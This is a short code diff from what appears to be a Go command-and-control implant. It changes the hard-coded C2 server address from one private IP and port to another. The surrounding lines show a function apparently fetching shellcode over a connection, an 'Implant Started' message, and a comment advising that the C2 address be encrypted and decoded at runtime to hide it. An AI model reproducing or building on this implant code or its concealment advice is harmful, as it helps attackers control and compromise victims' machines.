@@ -174,7 +174,7 @@ func getSC(conn *net.Conn) ([]byte, int) {
 }
 
 func main() {
-	c2Address := "192.168.5.138:6969" //Have it encrypted or anything and decode it during runtime
+	c2Address := "192.168.0.106:6969" //Have it encrypted or anything and decode it during runtime
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
